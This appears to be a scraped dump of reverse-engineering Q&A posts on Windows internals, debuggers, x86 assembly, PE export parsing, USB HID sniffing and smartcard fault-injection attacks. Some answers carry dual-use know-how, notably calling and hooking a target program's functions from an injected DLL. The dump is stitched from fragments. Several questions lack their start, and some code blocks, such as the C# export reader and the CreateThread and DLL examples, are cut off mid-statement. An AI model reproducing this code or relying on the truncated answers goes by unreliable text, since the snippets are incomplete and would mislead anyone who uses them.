  <p>The main part of Javascript that drives xkcd's ""Time"" comic (<a href=""http://xkcd.com/1190/"">http://xkcd.com/1190/</a>), deobfuscated and annotated. The bulk of the script seems to be an implementation of EventSource - which, while important, is not terribly interesting for our purposes, so I've omitted it here. After some Googling around, I am in fact fairly certain that the EventSource implementation used here is <a href=""https://github.com/Yaffle/EventSource"">https://github.com/Yaffle/EventSource</a> - after minifying and beautifying that code, it looks very similar to what shows up in time07.min.js.</p>
</blockquote>

<p>As far as I can tell, it has no magic in it and serves just as a simple way for the server to let the client know when there is a new image. </p>

"/proc/self/maps equivalent on windows","720","","<p>I see that inspecting <code>/proc/self/maps</code> on Linux machines lets me see the pages that have been mapped in. As a result I can write a program to read and parse the pages it has mapped in.</p>

<p>How could one go about doing something similar for Windows? Are there any APIs for the same? If not, do you have any suggestions on how this could be done? Do you have any references you could link me to?</p>
","<p><a href=""https://msdn.microsoft.com/en-us/library/windows/desktop/aa366907%28v=vs.85%29.aspx"" rel=""nofollow"">VirtualQueryEx()</a> fills a <a href=""https://msdn.microsoft.com/en-us/library/windows/desktop/aa366775%28v=vs.85%29.aspx"" rel=""nofollow"">MEMORY_BASIC_INFORMATION</a> record with information about a contiguous range of pages containing the queried address. This can be used to walk the address space of a process, by starting with 0 and then using mbi.BaseAddress + mbi.RegionSize as the next address to query and so on. <a href=""https://msdn.microsoft.com/en-us/library/windows/desktop/ms683195%28v=vs.85%29.aspx"" rel=""nofollow"">GetMappedFileName()</a> can give you the name of mapped binaries (mbi.Type == MEM_IMAGE) and mapped files (MEM_MAPPED).</p>

<p>Address overflow is an issue when a 32-bit process runs queries on a 64-bit process; it seems that VirtualQueryEx() fails to fail in that situation and instead saturates the field in question (by setting it to 0xFFFFFFFF). However, that is not documented and hence not reliable. Alternative tests are <code>mbi.RegionSize &gt; DWORD_PTR(-1) - mbi.BaseAddress</code>, or <code>next_va &lt;= curr_va</code> when iterating.</p>

"Suspicious breakpoint message in ollydbg","720","","<p>i want to set a breakpoint and suddenly the following message appears:</p>

<pre><code> You want to place breakpoint outside the code section. INT3 breakpoint 
 set on data will  not execute and may have disastrous influence on the 
 debugged program. Do you really want to set breakpoint here ?

 Note: you can permanently disable this warning in Options|Security.
</code></pre>

<p>Without knowing what that is, I would guess that is not allowed to set the breakpoint. 
So my question would be:</p>

<p>How can I bypass the annoying message ? Or better: What must I do to not see this ?</p>
","<p>PE files have several sections like <code>.code</code> , <code>.data</code>, <code>.bss</code> etc. Each of the sections have a special purpose, such as the <code>.code</code> section <em>usually</em> contains the programs code i.e. the instructions, the <code>.data</code> sections houses the initialized variables etc.</p>

<p>The above rule is merely a convention followed by compilers. In a packed/obfuscated program, the convention may not always hold true. You can have instructions in data segment and vice-versa. This is done for various reasons like thwarting analysis ,disassembly etc.</p>

<p>When in Ollydbg you try to set a <code>INT3</code> breakpoint on an instruction that happens to be in a section marked for data, Ollydbg would complain and that is the message you see. </p>

<p>The reason for this is suppose that the instruction you set a breakpoint on is actually data. In this case, when the program reads in the value at the address it would read <code>0xCC</code> (INT3 -> 0xCC) instead of the actual value. That can crash the program. Further since this is a read operation, the breakpoint will never be hit.</p>

<p>If you want, you may disable the message in Ollydbg options, however doing that is not always recommended. Instead if you are sure that it is an instruction, you may ignore the warning and set the breakpoint.</p>

<p>The other way is instead of using a <code>INT3</code> breakpoint, set a Hardware breakpoint (HWBP) on execution at the aforesaid address. This way the program would not crash, even if the hwbp was set on data. HWBP's are enforced my the CPU and does not modify the program in any way unlike <code>INT3</code> breakpoints</p>

Looking through other peoples efforts turns up nothing to contribute either. On <a href=""https://github.com/grasses/NetEase-Wireless-MusicBox/blob/master/api.py"" rel=""nofollow"">this</a> Github project I've found there's a function for searches, it doesn't seem to do anything significant to the returned data:</p>

<pre><code> def search(self, s, stype=1, offset=0, total='true', limit=60):
        action = 'http://music.163.com/api/search/get/web'

            '__csrf': self.cookies['__csrf'],
        }
        return self.httpRequest('POST', action, data)
</code></pre>

<p>And when you look on the NetEase website itself and look at the API calls after a search, theres nothing, so its not like theres an extra API call involved in getting all the search data either. </p>

<p><strong>update to answer comment</strong>   </p>

<p>the breakpoint @NtAllocateVirtualMemory did not catch the allocation of vad 12<br>
which was RWX allotment from vad11 my breakpoint got hit only when vad 13 was allocated<br>
and printing vadtree i found that the vads had increased by 2 and one of them was the   7f6f0000 rwx page so maybe another way is used to add the vad to vad tree insted of   NtAllocateVirtualMemory it is possible that rwx needs to be reset and isnt being reset needs investigation</p>

<p>i can only confirm that the page is indeed HEAP and seems to mapped in almost every process
with EXECUTE_READ permissions on all the process vads except in csrss where it is RWX</p>

"What impact does noninvasive debugging have?","718","","<p>What impact does noninvasive user mode debugging with WinDbg have on the process?
Will it be detectable by the process?</p>

<p>Of course I could imagine that if the threads are suspended, differences in execution time of a function could be detected by comparing to ""usual"" values.</p>

<p>Microsoft itself <a href=""http://msdn.microsoft.com/en-us/library/windows/hardware/ff552274%28v=vs.85%29.aspx"">does not indicate</a> more impact than suspending threads. Is that true?</p>
","<p>It is effectively true that there is no additional impact.  Non-invasive debugging is simply suspending the process, and then reading the register context and memory.  Since there are no alterations to the memory, there isn't any physical thing to detect.  The timing discrepancies that it introduces are detectable, but the same effects can be produced by a system under heavy load, so the detection is unreliable for that reason (though the author of the detection routine might not care).</p>

<p>However, the very presence of an active debugger anywhere on the system is detectable, independently of the method used to debug.  The non-invasive debugging technique simply defeats some of the more common methods.</p>

<p>Is that a bug? Why did MinGW set <code>SUB ESP, 1C</code> as the entrypoint? Can I set Ollydbg to start at the correct entrypoint?</p>
","<p>No, this is not a bug. Likely this is because you confuse the executable's entry point address (where Olly breaks) with the address of your <code>main()</code> function (where you expect it to break). You should locate your <code>main()</code> and set a breakpoint there manually instead.</p>

<p>There is a lot going on behind the scene before execution flow reaches <code>main()</code>. The code that gets control first is hidden within the C Run-Time (CRT) library provided by your compiler and is linked in automatically when you link your executable. This code (aptly named CRT startup) is responsible for setting up various things when a C program starts up, mainly, initializes all the internals of the C runtime (there is a lot of other stuff which I won't mention here), performs C++ static objects' constructor calls, and at the end calls your <code>main()</code>. So to get things going, the linker sets up the entry point to inside this startup machinery, which is exactly what we observe.</p>

<p>Note: It is possible to strip all the CRT stuff from your executable at the expense of not having the C runtime library linked. Not sure whether this is what you would like to have.</p>

"How to understand the ""lpStartAddress""-Parameter of the function CreateThread","717","","<p>I have the following assembly code :</p>

<p>That would mean that the 4th parameter <code>lpThreadParameter</code> is a parameter of this.

I am little bit confused about that. Can someone explain it to me? The other attributes/parameters are clear.... </p>
","<p>In C pseudocode let's say you have a function called <code>doJob</code>. You want to create a thread to executes it.</p>

<pre><code>DWORD WINAPI doJob(LPVOID lpParameter){
    // Do some work. You can only pass one parameter.
    // If you need more parameters, define a structure
    // and send it though it's pointer.

Handle hThread = 
   CreateThread(&amp;attributes,dwStackSize,&amp;doJob,&amp;paramstruct,flags,&amp;newThreadIdBuffer);

"Why are PUSHF and POPF so slow?","715","","<p>the experiment is on <code>32-bit</code> <code>x86</code> Linux.</p>

<p>I am doing some static binary instrumentation work, and basically I am trying to insert some instructions below to the beginning of every basic block. </p>

<pre><code>BB23 : push %eax

movl index,%eax
movl $0x80823d0,buf(,%eax,0x4)
add $0x1,%eax
cmp $0x400000,%eax
jle BB_23_stub
movl $0x0,%eax
BB_23_stub:movl %eax,index

pop %eax
</code></pre>

<p>Note that I need to use <code>cmp</code> instruction, and in order to guarantee that <code>flags</code> can restore to the original value, I use <code>pushf</code> and <code>popf</code> to store\load <code>flags</code> on the stack. </p>

<p>Then it becomes this:</p>

<pre><code> BB_23 :    push %eax
       pushf               
       movl index,%eax
       movl $0x17,buf(,%eax,0x4)
       add $0x1,%eax

BB_23_stub:movl %eax,index
       popf             
       pop %eax
</code></pre>

<p>I tested the performance with and without <code>pushf</code> and <code>popf</code> (I am using <code>gzip</code> and <code>bzip</code>). And to my surprise, performance penalty could increase  even 3 times after using the <code>pushf</code> and <code>popf</code> instructions!!</p>

<p>However, without <code>pushf</code> and <code>popf</code>. The compression results of <code>gzip</code> and <code>bzip</code> are incorrect.</p>

<p>So here is my question:</p>

<p>Why pushf and popf so slow? Am I using it in a correct way?</p>

<p>I cannot afford too much performance penalty introduced by pushf and popf. Is there any way I can avoid the high overhead and also keep the correct semantics? (protecting the value in flags, basically..)</p>

<p>Am I clear enough? Could anyone give me some help?</p>
","<p>Clever (some would say incomprehensible) misuse of x86 features could do this for you. The <code>loop</code> instruction will decrement the <code>ecx</code> register, jump if it's nonzero, and not modify flags. You can use this as a <code>jump forward</code> instruction as well, like this:</p>

<pre><code>BB23:      push %ecx
           movl index, %ecx
           movl $0x17, buf-4(,%ecx,4)
           loop BB23_stub
           movl $0x400000, %ecx
BB23_stub: movl %ecx, index
           pop %ecx
</code></pre>

<p>Note that ecx runs from 0x400000 to 1 here, not from 0 to 0x3fffff, so i had to subtract <code>4</code> from the address of <code>buf</code>, and you need to read the buffer top to bottom when analyzing it. Don't forget to initialize <code>index</code> to <code>0x400000</code> at the start of your code somewhere. You'll have to test how much the penalty of  branching in <code>loop</code> costs in comparison to how much removing <code>pushf</code>/<code>popf</code> gains.</p>

I was able to perform some basic tasks after having loaded the .dll into application's memory space like invoking a <code>MessageBox</code> on <code>DLLEntry</code> and some others. 
But how can one manipulate with the code of the application itself, eg. calling a certain procedure that is part of the application, or simply modifying a variable? 
Most tutorials I have read online discuss only injection process itself, but not the actual manipulations with applications. Or at least I am having trouble finding that information. </p>

<p>So, how to find/extract the memory parts of the application you are interested in and then modify/alter them?</p>
","<p>If you want to use a function in the application the bottom line is that you need to know where it's located.  Without ASLR you can hardcode the address of the function into your DLL, and use a function pointer to call it.  If you want to modify data from a function in a loaded library then you would need to hook that function, and call your own code for its operations.</p>

<p>If an application's function is at 0x0041A000 you can create a function pointer if you know all the information about the function; the call convention, return value, and parameters.  Assume it's a <code>__stdcall</code>, two <code>VOID *</code>parameters, and returns a <code>DWORD</code>.</p>

<pre><code>typedef DWORD (WINAPI *FunctionType)(VOID *a, VOID *b);

DllEntry(...)
{
    FunctionType function = (FunctionType) 0x0041A000;

}

<p>You can also hook that function by using the <a href=""http://research.microsoft.com/en-us/projects/detours/"" rel=""nofollow noreferrer"">Windows Detours</a> library.  Again you would hardcode the address of the function you want to hook, and write your own version of the function.  You need to make sure that it returns the same type of value as the real function to ensure nothing breaks in the calling function.  Using <code>GetProcAddress</code> you can hook a function call of a library rather than the application's function.  </p>

<p>This all gets complicated with ASLR.  As the application might not be at the location you think it is.  <a href=""https://stackoverflow.com/a/11564232/3714897"">This answer</a> can help with the calculations of certain sections determined by the base address of the program.</p>

","<p>It's cl.exe that's inserting the jump thunk. It has some advantages, such as making it easier to redirect a function during runtime after load and makes it so that the loader only has to do a single relocation for that function. The other option would be to use an indirect call through an address. Neither is really optimal for performance due to the distance between the call and the jump or the address, which can hurt caching. You can <a href=""http://msdn.microsoft.com/en-us/library/4khtbfyf%28VS.80%29.aspx"">disable the jump thunk by disabling incremental linking</a>.</p>

<p>That said, what you're doing is probably a bad idea. IDA is not really made to produce code that can be reassembled. What's normally done is that you extend the last section or add a new section with the patched code then redirect the original code to the patch through a call or a jump.</p>

<p>This code was generated by Windows Visual C++ 2005 with buffer overflow protection turned off and disassembled with IDA Pro 4.9 Free Version.</p>

<p>I'm trying to understand what each line does.</p>

<p>the first line is <code>push ebp</code>. </p>

<p>I know <code>ebp</code> stands for <strong>base pointer</strong>. What is its function? </p>

<p>I see that in the second line the value in <code>esp</code> is moved into <code>ebp</code> and searching online I see that there first 2 instructions are very common at the beginning of an assembly program. </p>

<p>Though are <code>ebp</code> and <code>esp</code> empty at the beginning? I'm new to assembly. Is <code>ebp</code> used for stack frames, so when we have a function in our code and is it optional for a simple program?</p>

<p>Then <code>push offset aHelloWorld; ""Hello world\n""</code></p>

<p>The part after <code>;</code> is a comment so it doesn't get executed right? The first part instead adds the address containing the string Hello World to the stack, right? But where is the string declared? I'm not sure I understand.</p>

<p>Then <code>call ds:__imp__printf</code></p>

<p>it seems it's a call to a function, anyway <code>printf</code> is a builtin function right?
And does <code>ds</code> stand for <strong>data segment register</strong>? Is it used because we are trying to access a memory operand that isn't on the stack?</p>

<p>then <code>add esp, 4</code></p>

<p>do we add 4 bytes to esp? Why?</p>

<p>then <code>move eax, 1234h</code>  what is 1234h here?</p>

<p>then <code>pop ebx</code>..it was pushed at the beginning. is it necessary to pop it at the end?</p>

<p>then <code>retn</code> ( i knew about <code>ret</code> for returning a value after calling a function). I read that the n in retn refers to the number of pushed arguments by the caller. It isn't very clear for me.
Can you help me to understand? </p>
","<p>first up: I would recommend you to try and write some simple assembly programs or use an intermediate representation like REIL to get a hang of it (REIL has only ~17 instructions).</p>

<pre><code>push ebp
mov ebp, esp
</code></pre>

<p>The first two lines build the <em>stack frame</em>. As you correctly mentioned, ebp describes the current stack frame. So when this function is called from another function, is saves the previous base pointer on the stack to be able to restore it when the function returns. When the value is saved, the function assignes the current location on the stack to be the new base pointer for this fuction.</p>

<p>This assignments are called function prolog and are common among different disassembleres. Mainly the ebp is used to reference function arguments, while the esp can be modified freely (by pushing variables on the stack, etc.)</p>

<pre><code>push offset aHelloWorld; ""Hello world\n"" 
</code></pre>

<p>This function pushes the <strong>address</strong> of the String ""Hello world\n"" on the stack. The comment at the end is just for convenience matters. Please note pushing something on the stack modifies esp by the (byte-size) of the given value. In this case 4 for x32 and 8 for x64 references (<code>esp=esp-4</code>).</p>

<pre><code>call ds:__imp__printf
</code></pre>

<p>This call does not directly jump to the function, because the function is loaded dynamically and the code does not know where the function is located in the address space. So it calls a reference to the location, which is the ""jump table"" or in this case rather ""import table"". When a binary is loaded, the systems loader ensures that it loads the dependencies and leaves the correct addresses for the program to use there. (<strong>imp</strong> stands for ""import"").</p>

<pre><code>add esp, 4
</code></pre>

<p>Based on the calling convention (how are arguments passed? who cleans them from the stack?) printf does not clean up its stack before returning. So the calling function must do it itself. It adds 4 to the stack pointer to revert the changes from the <code>push</code> instruction (which subtracted 4 from esp implicitly).</p>

<pre><code>mov eax, 1234h
</code></pre>

<p>Nothing special here. The value 0x1234 is <em>moved</em> to the register eax (apparently for no reason). I assume this is the return value of the program (unix convention is to return 0 in eax if there was no failure).</p>

<pre><code>pop ebp
</code></pre>

<p>This instruction reads the former value of ebp from the stack and stores it in ebp again. Please note you must keep track of the order in which things were pushed on the stack (Last-In-First-Out). Note that this instruction also adds 4 to the esp implicitly.</p>

<pre><code>retn
</code></pre>

<p>Resume execution at the location at the current esp. When a function is called, the calling fucntion pushes the address to return to on the stack. Also, this function adds 4 to esp to 'remove' the address from the stack.</p>

"Chunked function (discontinuous chunks of code comprising a function)","701","","<p>The control flow graph below is from a single function in Notepad (Win7 64-bit). Why is the linker (or the compiler) separating the basic blocks of a single function into multiple, discontinuous chunks?</p>

<p><img src=""https://i.stack.imgur.com/GM19m.png"" alt=""Function CFG""> </p>
","<p>DCoder already referenced <a href=""https://reverseengineering.stackexchange.com/a/3169/245"">his own answer</a> in a comment.</p>

<p>The chunks in the control flow graph are usually referred to as basic blocks or extended basic blocks. The reason why they are being reordered has to with <a href=""http://en.wikipedia.org/w/index.php?title=Optimizing_compiler&amp;oldid=592712045#Other_optimizations"" rel=""nofollow noreferrer"">optimizations performed by the compiler</a>.</p>

<p>There are several terms for what you are asking about:</p>

<ul>
<li>function chunking</li>
<li>basic block reordering</li>
<li>partition interleaving</li>
</ul>

<p>I strongly suggest that if you are interested in this topic, you read up on compiler design. In particular I would suggest reading ""the dragon book"" (""Compilers - Principles, Techniques, &amp; Tools"" by Aho, Lam, Sethi and Ullman) and there the parts about optimization. Here I refer to the second edition from 2007 (ISBN: 0-321-48681-1).</p>

<p>Check out the sections 8.4 (""Basic Blocks and Flow Graphs"") and 8.5 (""Optimization of Basic Blocks"") and in the latter 8.5.7 (""Reassembling Basic Blocks From DAGs""). But that's only the beginning. Chapter 9 is equally important as a whole and so is section 11.10 (""Locality Optimizations""). Quoting one of the reasons for the kind of optimization you're asking about from the introductory paragraph of the subsection on partition interleaving:</p>

<blockquote>
  <h2>11.10.3 Partition Interleaving</h2>
  
  <p>Different partitions in a loop often read the same data, or read and write the same cache lines. [...]</p>
</blockquote>

<p>quoted from <strong>""Compilers - Principles, Techniques, &amp; Tools""</strong> by Aho, Lam, Sethi and Ullman.</p>

<p>This boils down to what DCoder has already mentioned in his/her comment to your question.</p>

<p>Oh and the book <strong>""Reversing: Secrets of Reverse Engineering""</strong> is also a good read that discusses this in part. However, it's more focused on the ""how does it look"" than the ""why is it done"".</p>

<p><strong>EDIT</strong> The correct algorithm is regular CRC16 (0x8005 polynom). Thanks booto for correct answer.</p>
","<p>It's a <strong>big-endian CRC16</strong> (polynomial <code>0x8005</code>) of the data from the byte following the <code>0x82</code> up to and including the byte before the CRC.</p>

<p>For example, for your last RX frame:</p>

<pre><code>82 00 00 00 ff 00 00 00 01 01 4c 4f 0c 6a 83

<p>To find out this CRC algorithm, I assumed that <code>0x82</code> was a '<em>Start-of-Frame</em>' marker and <code>0x83</code> was an '<em>End-of-Frame</em>' marker. Then, I plugged the remaining data (sans crc field) into this on-line CRC calculation application and the emitted CRC16 looked correct. </p>

<p>I, then, checked a few of the other frames you supplied and verified the CRC calculation with other sources.</p>

"(bad) opcodes of objdump","696","","<p>I'm trying to write my own disassembler for PE,PE+ and ELF executables but I'm stuck with a big problem on PE and PE+ executables.</p>

<p>I'm checking my work by comparing my output with objdump, and I found some (bad) opcodes appear in the disassembled program. I immediately checked the instruction manual to control these values; they are shown as invalid in instruction manual. Some examples:</p>

<p>Example from PE files:</p>

<pre><code>40dad1:       d6                      (bad)
</code></pre>

<p>Some other:</p>

<pre><code>402f1c:       ff                      (bad)
402f1d:       ff                      (bad)
402f1e:       ff                      (bad)
402f1f:       ff 01                   incl   (%ecx) #at last a valid instruction
</code></pre>

<p>These are valid when I check the manual, but I cannot understand this (it's a PE+ file, architecture is AMD64):</p>

<pre><code>f0 db a5 4e 9c 95 68    lock (bad) [rbp+0x68959c4e]

f0 is lock prefix
db means its a x87 instruction
a5 is ModRM byte(10 100 101) and by looking mod and reg fields we can say it's an invalid instruction
4e 9c 95 68 is used as 4byte disp but why ?
</code></pre>

<p>Do we assume that it's an invalid indirect x87 opcode and we continue to read as it's a valid opcode? I suppose objdump chooses this path.</p>

<p>And what are these (bad) instructions for? It's clear that they are not for aligning; or am I doing something wrong?</p>

<p>Btw, I'm trying to disassemble my old projects and FireFox to check if my program works. I'm using <code>objdump -z -d -M intel XXYYZZ.exe</code> to disassemble.</p>
","<p>You are correct, and <code>objdump</code> is actually wrong to disassemble such instruction, only to mark it as <code>(bad)</code> in a later stage.</p>

<p>Here is how it works:</p>

<pre><code>db a5 4e 9c 95 68    lock (bad) [rbp+0x68959c4e]
</code></pre>

<p><code>db</code> is one of the 87 FPU extensions, and <code>a5</code> indeed is the Mod/rm byte. Now, for the FPU extensions, the rm part is ""as usual"" for all other mod/rm instructions, but the mod part indicates which instruction to use, from this small table:</p>

<pre><code>DB /0     FILD mem4i
DB /2     FIST mem4i
DB /3     FISTP mem4i
DB /5     FLD mem10r
DB /7     FSTP mem10r
</code></pre>

<p>where the <code>/x</code> number indicates what got encoded in the mod part of the mod/rm byte (for completeness: <code>db eX</code> also forms some valid opcodes).</p>

<p>So of all available codes, those with the mod/rm patterns of <code>..001...</code>, <code>..100..</code> and <code>..110...</code> form 'bad' codes - but you only know this <em>after</em> parsing the mod/rm byte <em>and</em> checking this specific table for the opcode <code>DB</code>.</p>

<p>Now apparently objdump parses the entire instruction - including the 4-byte immediate value - <em>before</em> checking if the base instruction is valid to start with. I suppose it's just a table that says</p>

<pre><code>""fild"", ""(bad)"", ""fist"", ""fistp"", ""(bad)"", ""fld"", ""(bad)"", ""fstp""
</code></pre>

<p>and the <code>(bad)</code> entries get used as if they are actually valid.</p>

<p>One could argue that it's immaterial, because both ways lead to the conclusion the opcode is 'bad', but with objdump's method, you are not only discarding the first byte as 'bad' but an entire 6 bytes. It is at least <em>theoretically</em> possible the first byte (which causes the entire next sequence to be invalid) is data but followed <em>immediately</em> by correct code, which would then start with the sequence <code>a5 4e 9c 95 68</code> - which is skipped entirely by objdump.</p>

<blockquote>
  <p>.. what are these (bad) instructions for?</p>
</blockquote>

<p>I suppose, looking at the other instructions that you show, that you are disassembling a wrong part of the executable and this is not supposed to be code at all but data instead.</p>

<p>You should check the PE/PE++ headers to find the <em>sections</em>, and then only attempt disassembly on a section marked as ""code"" and/or ""executable"" in its <code>Characteristics</code> field. Even then, it's possible to start at a 'wrong' position (e.g., in the middle of a longer instruction) or inside data (which may also reside inside a <code>.code</code> section).</p>

<p>This is a USB keyboard emulation device, so when you swipe a card, the data on tracks 1 and 2 are typed on the screen into whatever program you have open at the time.</p>

<p>I'm trying to learn about USB reverse engineering, so I'm trying to understand how this device sends data to my computer. After swiping a card and seeing the data on the screen, I try to find that data in the USB requests that go back and forth between my computer and the device. To do this, I use <a href=""https://www.kernel.org/doc/Documentation/usb/usbmon.txt"" rel=""nofollow"">usbmon</a>:</p>

<pre><code># cat /sys/kernel/debug/usb/usbmon/1u
</code></pre>

<p>I've read up on the output of <code>usbmon</code> and I've also tried looking at the data using <a href=""http://vusb-analyzer.sourceforge.net/"" rel=""nofollow"">vusb-analyzer</a>, but I can't find any of the data I expect to see in the data stream.</p>

<p>Here is an example of the output on the screen and the output from <code>usbmon</code> after swiping an old (inactive) ID card from Oakland University.</p>

<p>Output on screen:</p>

<pre><code>%000127138,6361380000058657,SINGH,?;6361380000058657=123456789012?+000127138?

","<p>Since it uses HID class, you should probably check the <a href=""http://www.usb.org/developers/devclass_docs/HID1_11.pdf"" rel=""nofollow"">USB HID Spec</a> from USB.org. The relevant part seems to be the section 8, ""Report Protocol"":</p>

<blockquote>
  <h1>8.1 Report Types</h1>
  
  <p>Reports contain data from one or more items. Data transfers are sent from the device to the host through the <strong>Interrupt In</strong> pipe in the form of reports. Reports may also be requested (polled)

<p><code>Ii</code> in the usbmon log refer to ""Interrupt In"", so these are ""reports"" from the device. Looks like the changing bytes in the data packets (such as 22, 27, 1e, 1f) correspond to keyboard keys.

"Are there exports with neither ordinal nor name or am I not understanding the PE documentation?","694","","<p>I don't understand one thing in the export data directory of PE files.</p>

<p>The documentation says that there is a set count of exports (let's name it <code>ExportCount</code>, first row of following table) and another count of names/ordinals (name it <code>NameCount</code>, second row in following table). I read it like that the count of export names is the same as the ordinal indices count. At least that's what <a href=""https://msdn.microsoft.com/en-us/windows/hardware/gg463119.aspx"" rel=""nofollow noreferrer"">their documentation</a> says:</p>

<p><img src=""https://i.stack.imgur.com/KcSxK.png"" alt=""Microsoft Documentation""></p>

<p>I tried parsing a Win8.1.1 x64 Shell32.dll, and I get different results compared to Dependency Walker. I have 933 as <code>ExportCount</code> and 354 as <code>NameCount</code>. So there should be 933 exports in total, with only 354 having an ordinal and/or name. Don't ask me how you would import the remaining 579 exports, as that's what I don't understand.</p>

<p>If I open Shell32 in Dependency Walker, it first lists <code>NameCount</code> exports with a name and ordinal, but then it shows the remaining amount of <code>ExportCount - NameCount</code> exports which surprisingly <em>do</em> have ordinals (starting at the blue line here):</p>

<p><img src=""https://i.stack.imgur.com/rKVrl.png"" alt=""Dependency Walker""></p>

<p>To me, this doesn't make any sense according to the documentation. I tried to read <code>ExportCount</code> ordinals instead of only <code>NameCount</code> ones in sequence, but only rubbish comes out.</p>

<p>So my questions are:</p>

<ul>
<li>Is the documentation wrong / incomplete?</li>
<li>Am I understanding something wrong in the documentation?</li>
<li>How to get the remaining ordinals like Dependency Walker does it?</li>
</ul>

<p><strong>EDIT:</strong> Thanks to Guntrams answer below, I found out where my brain was faulty. This is how it really is:</p>

<ul>
<li>The ordinal of each exported address is simply the index in the export address array (plus the ordinal base specified in the export directory table however, which <em>may</em> make it differ from simple indices. And that is often the case since ordinals usually start at 1 according to the documentation).</li>
<li>Some exports have names, and these names are mapped to the export address array with an ordinal, which in turn is the index to the export address array.</li>
<li>Since some exports have no names, the ordinal is not explicitly specified in the ordinal array, because it would make no sense to map ""no name"" to an export.</li>
</ul>

<p>My C# code does it like this, for reference - the output is the same like the one in Dependency Walker:</p>

<pre><code>private void ReadExportTables(PEFile peFile, BinaryReader reader, DataDirectoryHeader header)
{
    // Read the export address table which contains the RVAs to the exported code or forwarder names.
    ExportEntry[] exportEntries = new ExportEntry[EntryCount];
    reader.BaseStream.Seek(peFile.GetFileOffset(CodeAddressTableRva), SeekOrigin.Begin);
    for (int i = 0; i &lt; exportEntries.Length; i++)
    {
        exportEntries[i].Ordinal = (ushort)(i + OrdinalStartNumber);
        exportEntries[i].CodeOrForwarderRva = reader.ReadUInt32();
    }

    // Read the ordinal table containing indices (with base) to named entries in the export entry table.
    reader.BaseStream.Seek(peFile.GetFileOffset(OrdinalTableRva), SeekOrigin.Begin);
    uint[] ordinals = new uint[NameEntryCount];
    for (int i = 0; i &lt; ordinals.Length; i++)
    {
        // Get the name for the ordinal, which has the same index as the ordinal array element.
        ordinals[i] = reader.ReadUInt16();
    }

    // Read the export name pointer table which contains pointers to names of exports.
    reader.BaseStream.Seek(peFile.GetFileOffset(NameAddressTableRva), SeekOrigin.Begin);
    for (int i = 0; i &lt; ordinals.Length; i++)
    {
        exportEntries[ordinals[i]].Hint = i;
        exportEntries[ordinals[i]].NameRva = reader.ReadUInt32();
    }

    // Read the names of the exports or forwarders.
    for (int i = 0; i &lt; exportEntries.Length; i++)
    {
        if (exportEntries[i].NameRva &gt; 0)
        {
            reader.BaseStream.Seek(peFile.GetFileOffset(exportEntries[i].NameRva), SeekOrigin.Begin);
            exportEntries[i].Name = reader.ReadString(BinaryStringFormat.ZeroTerminated, Encoding.ASCII);
        }
        // Check if it's a forwarder export (the RVA points within the export directory to a forwarder name).
        if (exportEntries[i].CodeOrForwarderRva &gt;= header.Rva
            &amp;&amp; exportEntries[i].CodeOrForwarderRva &lt; header.Rva + header.Size)
        {

                SeekOrigin.Begin);
            exportEntries[i].ForwarderName = reader.ReadString(BinaryStringFormat.ZeroTerminated,
                Encoding.ASCII);
        }
    }

<p>In case you wondered: There can still be completely empty exports, with a code address of 0, no name and thus not forwarded. Just sort these out when displaying your exports.</p>
","<p>If i understand <a href=""http://win32assembly.programminghorizon.com/pe-tut7.html"" rel=""nofollow"">http://win32assembly.programminghorizon.com/pe-tut7.html</a> correctly, the ordinal table lists <em>only</em> the number of exports that actually have a name. So, your program might have the following exports:</p>

<pre><code>n  name            address
0  funca           12345678
1  -- no name --   9abcdef0
2  funcb           76543210
3  -- no name --   fedcba98
</code></pre>

<p>This would result in</p>

<pre><code>address table entries   = 4
number of name pointers = 2
export address table    = [ 12345678, 9abcdef0, 76543210, fedcba98 ]
name pointer table      = [ funca, funcb ]
ordinal table           = [ 0, 2 ]
</code></pre>

<p>There's a 1:1 match between name pointer entries and ordinal table entries, which is why the number of name pointers equals both array sizes. But both tables list only the functions exported by name; exports that are by ordinal only don't appear in either of them. They still appear in the export address table, however.</p>

"What is fault-injection reverse engineering? What are the techniques involved?","692","","<p>Trying to extract data from the hardware is often quite difficult (especially when dealing with smartcards). Fault-injection attacks allow to guess cryptographic keys based on the propagation of errors through the encryption/decryption algorithm. I know some of the types of fault-injections possible, but not all.</p>

<ul>
<li>What are the different types of fault-injections possible?</li>
<li>Do the different types of techniques offer any special advantages?</li>
</ul>
","<h3>Fault Injection Attacks</h3>

<p>Basically, we assume here that we have a black-box that produces an output using a known algorithm but with some unknown parameters. In the case of cryptography, the black-box could be a chip on a smart-card, the know algorithm could be a cryptographic algorithm and the unknown parameters would be the key of the algorithm which lies hidden in the chip (and never go out).</p>

<p>In this particular setting, we can perform what we call a '<em>chosen clear-text attack</em>', meaning that we can choose the inputs of the black-box and look at the output. But, lets also suppose that this is not enough to guess the unknown parameters (the key). So, we need a bit more to help us.</p>

<p>Our second assumption will be that we are able to introduce errors at specific chosen phase of the known algorithm. Usually, when speaking about smart-cards, it means that we have a physical setup with a very precise timer linked to the smart-card clock and a laser targeting a physical register on the chip. Beaming up the register with the laser, usually reset the register (or may introduce some random values).</p>

<p>The point of fault-injection is thus to study the effect of the injected fault on the cipher algorithm and to deduce some information about the value of the key.</p>

<p>Depending on the cipher algorithm used in the chip, the most interesting bits to reset in order to maximize the information collected about the key may vary a lot because the propagation of the error is not the same depending on the computation performed. So, each cipher algorithm need to be studied first, in order to know the best way to proceed in order to extract the key.</p>

<h3>Types of Fault-injection Attacks</h3>

<p>The different types of fault-injection analysis depends mainly on the accuracy with which you can control the error that you introduce (from the easiest to the most difficult):</p>

<ul>
<li><strong>Fully controlled error</strong>: We suppose that we have a full control on the error. Basically, we can choose what is the content of the register and when to introduce the error in the algorithm.</li>
<li><strong>Known error</strong>: We suppose that we have a partial control on the error. Meaning that we know where it has been introduced and we know what is written in the register but we cannot choose it in advance.</li>
<li><strong>Unknown error</strong>: We know exactly where, in the algorithm, the error has been introduced but we cannot control what is written nor have a knowledge of what has been written in the register.</li>
<li><strong>Fully uncontrolled error</strong>: We have no exact knowledge of what is written nor when it has been introduced in the algorithm.</li>
</ul>

<h3>Counter-measures</h3>

<p>Countering fault-injection is, in fact, quite easy but costly. You only need to duplicate the circuits and check that the two circuits gives the same output when finished. If not, you just have to issue an error without leaking any information.</p>

<p>Of course, in the case of a '<em>fully controlled error</em>' attack, one can just duplicate the laser beam as well. But, usually, the '<em>fully controlled error</em>' attack is an ideal case that is almost never reached in practice.</p>

